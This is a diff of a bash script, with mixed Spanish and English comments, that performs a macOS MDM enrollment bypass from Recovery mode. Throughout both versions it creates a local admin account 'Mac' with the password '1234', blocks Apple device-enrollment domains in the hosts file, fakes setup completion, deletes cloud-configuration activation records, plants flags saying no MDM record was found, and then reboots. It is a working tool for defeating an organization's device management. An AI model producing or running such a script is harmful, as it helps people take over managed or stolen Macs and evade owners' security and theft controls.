@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Colores para la interfaz
+# Define color codes
 RED='\033[1;31m'
 GRN='\033[1;32m'
 BLU='\033[1;34m'
@@ -8,111 +8,112 @@ YEL='\033[1;33m'
 NC='\033[0m'
 
 error_exit() { echo -e "${RED}ERROR: $1${NC}" >&2; exit 1; }
-warn() { echo -e "${YEL}ADVERTENCIA: $1${NC}"; }
+warn() { echo -e "${YEL}WARNING: $1${NC}"; }
 success() { echo -e "${GRN}✓ $1${NC}"; }
 info() { echo -e "${BLU}ℹ $1${NC}"; }
 
-info "Iniciando análisis avanzado del sistema..."
-
-SYSTEM_PATH=""
-DATA_PATH=""
-
-# 1. Detección robusta basada en la estructura real de macOS
-for vol in /Volumes/*; do
-    if [ -d "$vol" ] && [ "$vol" != "/Volumes/Recovery" ] && [ "$vol" != "/Volumes/VM" ]; then
-        if [ -d "$vol/private/var/db/dslocal/nodes/Default" ]; then
-            DATA_PATH="$vol"
-        fi
-        if [ -d "$vol/System/Library" ]; then
-            SYSTEM_PATH="$vol"
-        fi
-    fi
-done
-
-if [ -z "$DATA_PATH" ] && [ -z "$SYSTEM_PATH" ]; then
-    error_exit "No se detectó ninguna instalación válida de macOS. ¿Estás en el Terminal de Recuperación?"
-fi
-
-# Ajuste para sistemas con volumen único o contenedores unificados
-if [ -n "$SYSTEM_PATH" ] && [ -z "$DATA_PATH" ]; then
-    DATA_PATH="$SYSTEM_PATH"
-elif [ -z "$SYSTEM_PATH" ] && [ -n "$DATA_PATH" ]; then
-    SYSTEM_PATH="$DATA_PATH"
-fi
-
-dscl_path="$DATA_PATH/private/var/db/dslocal/nodes/Default"
-
-# Localizar archivo hosts correctamente
-hosts_file="$SYSTEM_PATH/private/etc/hosts"
-if [ ! -f "$hosts_file" ] && [ -f "$SYSTEM_PATH/etc/hosts" ]; then
-    hosts_file="$SYSTEM_PATH/etc/hosts"
-fi
-
-# 2. Filtro de seguridad mejorado
-check_previous_run() {
-    local ya_hecho=0
-    if dscl -f "$dscl_path" localhost -read "/Local/Default/Users/Mac" &>/dev/null; then
-        ya_hecho=$((ya_hecho + 1))
-    fi
-    if [ -f "$hosts_file" ] && grep -q "deviceenrollment.apple.com" "$hosts_file"; then
-        ya_hecho=$((ya_hecho + 1))
-    fi
-    
-    if [ $ya_hecho -gt 0 ]; then
-        echo ""
-        warn "El bypass ya parece estar aplicado o iniciado ($ya_hecho indicadores detectados)."
-        info "Cancelando ejecución para proteger los datos existentes. Saliendo..."
-        exit 0
-    fi
-}
-
-# 3. Asignación dinámica de ID de usuario (UID)
+# Find available UID (Corregido: ahora recibe la ruta explícitamente)
 find_available_uid() {
-    local uid=501
-    while [ $uid -lt 600 ]; do
-        if ! dscl -f "$dscl_path" localhost -search /Local/Default/Users UniqueID $uid 2>/dev/null | grep -q "UniqueID"; then
-            echo $uid
-            return 0
-        fi
-        uid=$((uid + 1))
-    done
-    echo "501"
+	local dscl_path="$1"
+	local uid=501
+	while [ $uid -lt 600 ]; do
+		if ! dscl -f "$dscl_path" localhost -search /Local/Default/Users UniqueID $uid 2>/dev/null | grep -q "UniqueID"; then
+			echo $uid
+			return 0
+		fi
+		uid=$((uid + 1))
+	done
+	echo "501"
+	return 1
 }
 
-check_previous_run
+# Function to detect system volumes (Tu lógica original que funciona perfecto)
+detect_volumes() {
+	local system_vol=""
+	local data_vol=""
+	info "Detecting system volumes..." >&2
+	for vol in /Volumes/*; do
+		if [ -d "$vol" ]; then
+			vol_name=$(basename "$vol")
+			if [[ ! "$vol_name" =~ "Data"$ ]] && [[ ! "$vol_name" =~ "Recovery" ]] && [ -d "$vol/System" ]; then
+				system_vol="$vol_name"
+				break
+			fi
+		fi
+	done
+	if [ -z "$system_vol" ]; then
+		for vol in /Volumes/*; do
+			if [ -d "$vol/System" ]; then
+				system_vol=$(basename "$vol")
+				break
+			fi
+		done
+	fi
+	if [ -d "/Volumes/Data" ]; then
+		data_vol="Data"
+	elif [ -n "$system_vol" ] && [ -d "/Volumes/$system_vol - Data" ]; then
+		data_vol="$system_vol - Data"
+	else
+		for vol in /Volumes/*Data; do
+			if [ -d "$vol" ]; then
+				data_vol=$(basename "$vol")
+				break
+			fi
+		done
+	fi
+	if [ -z "$system_vol" ] || [ -z "$data_vol" ]; then
+		error_exit "Could not detect volumes. Ensure you are in Recovery mode."
+	fi
+	echo "$system_vol|$data_vol"
+}
+
+volume_info=$(detect_volumes)
+system_volume=$(echo "$volume_info" | cut -d'|' -f1)
+data_volume=$(echo "$volume_info" | cut -d'|' -f2)
 
 echo ""
-info "Sistema apto detectado. Aplicando parches en:"
-for i in {3..1}; do
-    echo -ne "${YEL}$i... ${NC}"
-    sleep 1
-done
-echo -e "\n"
+success "System Volume: $system_volume"
+success "Data Volume: $data_volume"
+echo ""
 
-# Credenciales por defecto
+# Ejecución automática (Quitamos el menú para que sea rápido, pero con tu lógica base)
+if [ "$data_volume" != "Data" ]; then
+	diskutil rename "$data_volume" "Data" 2>/dev/null && data_volume="Data"
+fi
+
+system_path="/Volumes/$system_volume"
+data_path="/Volumes/$data_volume"
+dscl_path="$data_path/private/var/db/dslocal/nodes/Default"
+
+# Filtro de seguridad: Si ya existe el usuario "Mac", frena para no romper nada
+if dscl -f "$dscl_path" localhost -read "/Local/Default/Users/Mac" &>/dev/null; then
+	warn "El usuario 'Mac' ya existe en este equipo. Cancelando para evitar duplicados."
+	exit 0
+fi
+
+# Configuración Automática Mac / 1234
 realName="Mac"
 username="Mac"
 passw="1234"
 
-info "Creando usuario administrador local ($username)..."
-available_uid=$(find_available_uid)
+info "Creating User: $username"
+available_uid=$(find_available_uid "$dscl_path")
 
-# Creación de la estructura del usuario en la base de datos local de macOS
 dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" 2>/dev/null
 dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
 dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
 dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "$available_uid"
 dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"
 
-user_home="$DATA_PATH/Users/$username"
+user_home="$data_path/Users/$username"
 mkdir -p "$user_home" 2>/dev/null
-
 dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
 dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$passw"
 dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership "$username"
 
-# 4. Bloqueo de servidores MDM ampliado (Incluye nuevos dominios de Apple)
-info "Aplicando restricciones en el archivo hosts de destino..."
+# --- MEJORAS DE LA V3 (BLOQUEO AMPLIADO) ---
+info "Configuring hosts file..."
+hosts_file="$system_path/etc/hosts"
 dominios_mdm=(
     "deviceenrollment.apple.com"
     "mdmenrollment.apple.com"
@@ -127,33 +128,24 @@ for domain in "${dominios_mdm[@]}"; do
     fi
 done
 
-# 5. Limpieza profunda de ConfigurationProfiles y banderas de activación
-info "Removiendo registros persistentes de gestión remota..."
-config_path="$SYSTEM_PATH/private/var/db/ConfigurationProfiles"
-if [ ! -d "$config_path" ]; then
-    config_path="$SYSTEM_PATH/var/db/ConfigurationProfiles"
-fi
+# --- MEJORAS DE LA V3 (LIMPIEZA PROFUNDA DE CONFIGURATION PROFILES) ---
+info "Cleaning up MDM activation records..."
+config_path="$system_path/var/db/ConfigurationProfiles/Settings"
+mkdir -p "$config_path" 2>/dev/null
 
-mkdir -p "$config_path/Settings" 2>/dev/null
-
-# Forzamos la simulación de que el asistente inicial ya terminó
-touch "$DATA_PATH/private/var/db/.AppleSetupDone" 2>/dev/null
-
-# Eliminamos cualquier registro previo que la Mac haya descargado de los servidores de Apple
-rm -rf "$config_path/Settings/.cloudConfigHasActivationRecord" 2>/dev/null
-rm -rf "$config_path/Settings/.cloudConfigRecordFound" 2>/dev/null
+# Forzar marcas de activación completada y bloqueo de registros viejos
+touch "$data_path/private/var/db/.AppleSetupDone" 2>/dev/null
 rm -rf "$config_path/.cloudConfigHasActivationRecord" 2>/dev/null
 rm -rf "$config_path/.cloudConfigRecordFound" 2>/dev/null
+rm -rf "$system_path/var/db/ConfigurationProfiles/.cloudConfigHasActivationRecord" 2>/dev/null
+rm -rf "$system_path/var/db/ConfigurationProfiles/.cloudConfigRecordFound" 2>/dev/null
 
-# Engañamos al sistema indicando que no se encontraron perfiles MDM para este número de serie
-touch "$config_path/Settings/.cloudConfigProfileInstalled" 2>/dev/null
-touch "$config_path/Settings/.cloudConfigRecordNotFound" 2>/dev/null
+touch "$config_path/.cloudConfigProfileInstalled" 2>/dev/null
+touch "$config_path/.cloudConfigRecordNotFound" 2>/dev/null
 
 echo ""
-success "¡Bypass Optimizado Completado con Éxito!"
-echo -e "${GRN}Acceso configurado -> Usuario: Mac | Clave: 1234${NC}"
-echo ""
-
-info "Reiniciando el equipo en 3 segundos..."
+success "MDM Bypass Completed!"
+echo "Login with username: Mac and password: 1234"
+echo "Rebooting in 3 seconds..."
 sleep 3
 reboot
